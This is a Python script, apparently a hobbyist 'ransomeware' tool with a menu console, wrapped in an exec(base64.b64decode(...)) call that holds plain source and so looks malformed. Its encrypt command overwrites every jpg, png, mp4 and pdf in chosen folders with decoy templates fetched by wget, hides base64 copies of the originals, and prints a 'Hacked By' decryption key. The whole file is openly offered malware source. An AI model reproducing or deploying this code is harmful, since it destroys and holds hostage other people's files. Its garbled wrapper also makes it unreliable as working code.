import base64
exec(base64.b64decode(b'#!/bin/python
#coding: utf-8

import os, sys, time, datetime, json, shutil, hashlib, random, base64, readline

array = []

class auto(object):
	def __init__(self, options):
		self.options = sorted(options)
	
	def complete(self, text, state):
		if state == 0:
			if text:
				self.matches = [s for s in self.options if s and s.startswith(text)]
			else:
				self.matches = self.options[:]
		try:
			return self.matches[state]
		except IndexError:
			return None

def complete(array):
	completer = auto(array)
	readline.set_completer(completer.complete)
	readline.parse_and_bind('tab:complete')

def loadingScreen(msg, msgIfDone = "    "):
	bars = [
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} ... {msgIfDone}"
	]
	for i in range(len(bars)):
		time.sleep(1./random.randint(1, 10))
		sys.stdout.write(f"\r{bars[i]}")
		sys.stdout.flush()
	print("")
	time.sleep(2)

banner = """
  ___  ___  _ _  ___  ___  __ __  ___  _ _ _  ___  ___  ___ 
 | . \| . || \ |/ __>| . ||  \  \| __>| | | || . || . \| __>
 |   /|   ||   |\__ \| | ||     || _> | | | ||   ||   /| _> 
 |_\_\|_|_||_\_|<___/`___'|_|_|_||___>|__/_/ |_|_||_\_\|___>
    Code by @vxin.dev      [ python ]     version 1.5-dev
"""

def startBanner():
	print(banner)

if os.path.exists(".ransomeware"):
	pass
else:
	os.mkdir(".ransomeware")
	open(".ransomeware/.paths.json", "w").write(json.dumps({
		"paths": []
	}, indent=4))
	
	if os.path.exists("assets/templates"):
		pass
	else:
		os.makedirs("assets/templates")
		os.system("wget -O assets/templates/template_jpg.x https://github.com/vHacks-development/templates/raw/main/template_jpg.x >> .ransomeware/.ransomeware.log")
		os.system("wget -O assets/templates/template_mp4.x https://github.com/vHacks-development/templates/raw/main/template_mp4.x >> .ransomeware/.ransomeware.log")
		os.system("wget -O assets/templates/template_pdf.x https://github.com/vHacks-development/templates/raw/main/template_pdf.x >> .ransomeware/.ransomeware.log")

templateJpg = open("assets/templates/template_jpg.x", "rb").read()
templateMp4 = open("assets/templates/template_mp4.x", "rb").read()
templatePdf = open("assets/templates/template_pdf.x", "rb").read()

time.sleep(2)
print("\033[H\033[J")
startBanner()

def ransomewareHelp():
	print("")
	print("CORE COMMANDS")
	print("=============")
	print("")
	print("\tCommand     Description")
	print("\t-------     -----------")
	print("\tadd         Add the folder to the folder list")
	print("\tdel         Remove the folder from the folder list")
	print("\tinfo        View the list of folders")
	print("\tencrypt     Run the virus and start file encryption")
	print("")

while True:
	try:
		prompt = input("ransomeware > ").split()
		if prompt[0] == "help" or prompt[0] == "?":
			ransomewareHelp()
		elif prompt[0] == "add":
			print("")
			try:
				if os.path.exists(prompt[1]):
					f = json.loads(open(".ransomeware/.paths.json", "r").read())
					if f"'{prompt[1]}'" in str(f["paths"]):
						print("[*] This folder already exists")
					else:
						f["paths"].append(prompt[1])
						open(".ransomeware/.paths.json", "w").write(json.dumps(f, indent=4))
						print(f"[*] The {prompt[1]} folder has been added to the list")
				else:
					print(f"[*] The {prompt[1]} folder cannot be added")
			except IndexError: 
				print("[*] Please enter the name of the folder you want to add")
			print("")
		elif prompt[0] == "del":
			print("")
			if prompt[1] == "all":
				open(".ransomeware/.paths.json", "w").write(json.dumps({
					"paths": []
				}, indent=4))
				print("[*] All folders have been removed from the list")
			else:
				try:
					f = json.loads(open(".ransomeware/.paths.json", "r").read())
					if f"'{prompt[1]}'" in str(f["paths"]):
						f["paths"].remove(prompt[1])
						open(".ransomeware/.paths.json", "w").write(json.dumps(f, indent=4))
						print(f"The {prompt[1]} folder has been removed from the list")
					else:
						print(f"[*] The {prompt[1]} folder is not in the list")
				except IndexError:
					print("[*] Please enter the name of the folder you want to delete")
			print("")
		elif prompt[0] == "info":
			print("")
			f = json.loads(open(".ransomeware/.paths.json", "r").read())["paths"]
			print("[*] List the folders you want to encrypt\n")
			totalFolder = 0
			for path in f:
				print(f"  ~ {path}")
				totalFolder += 1
			print("")
			print(f"{totalFolder} Folders listed")
			print("")
		elif prompt[0] == "encrypt":
			#Start encrypt
			print("")
			loadingScreen("Start encrypting")
			if os.path.exists(".ransomeware/.decrypt.key"):
				print("[*] You can't encrypt")
			else:
				num = 0
				loadingScreen("Encrypt all files")
				for path in json.loads(open(".ransomeware/.paths.json", "r").read())["paths"]:
					if os.path.exists(path):
						try:
							os.makedirs(f".ransomeware/.save/{path}")
						except FileExistsError:
							pass
						for file in os.listdir(path):
							if file[-4:] == ".jpg" or file[-4:] == ".png":
								f = open(f"{path}/{file}", "rb")
								open(f".ransomeware/.save/{path}/{file}.encrypt", "wb").write(base64.b64encode(f.read()))
								open(f"{path}/{file}", "wb").write(templateJpg)
								num += 1
							elif file[-4:] == ".mp4":
								f = open(f"{path}/{file}", "rb")
								open(f".ransomeware/.save/{path}/{file}.encrypt", "wb").write(base64.b64encode(f.read()))
								open(f"{path}/{file}", "wb").write(templateMp4)
								num += 1
							elif file[-4:] == ".pdf":
								f = open(f"{path}/{file}", "rb")
								open(f".ransomeware/.save/{path}/{file}.encrypt", "wb").write(base64.b64encode(f.read()))
								open(f"{path}/{file}", "wb").write(templatePdf)
								num += 1
					else:
						pass
				genKey = hashlib.sha256(f"Hacked By @Vxin.Dev ^_^ - Code: {random.randint(200, 404)}".encode("utf-8")).hexdigest()
				open(".ransomeware/.decrypt.key", "w").write(json.dumps({
					"key": genKey
				}, indent=2))
				os.system(f"zip -r .ransomeware/.save/ransomeware_{datetime.datetime.now().strftime('%d-%m-%y-%H%M%S')}.zip .ransomeware/.save/sdcard >> .ransomeware/.ransomeware.log")
				
				#Message When Done Encrypt
				print("\033[A[*] Encrypt all files ... done")
				print(f"[*] {num} Files have been encrypted")
				print(f"[*] Key to decrypt: {genKey}")
			print("")
		else:
			print(f"[*] Command not found: {prompt[0]}")
	except IndexError:
		pass
	except KeyboardInterrupt: 
		print("\n[*] Exit the console\n")
		break'))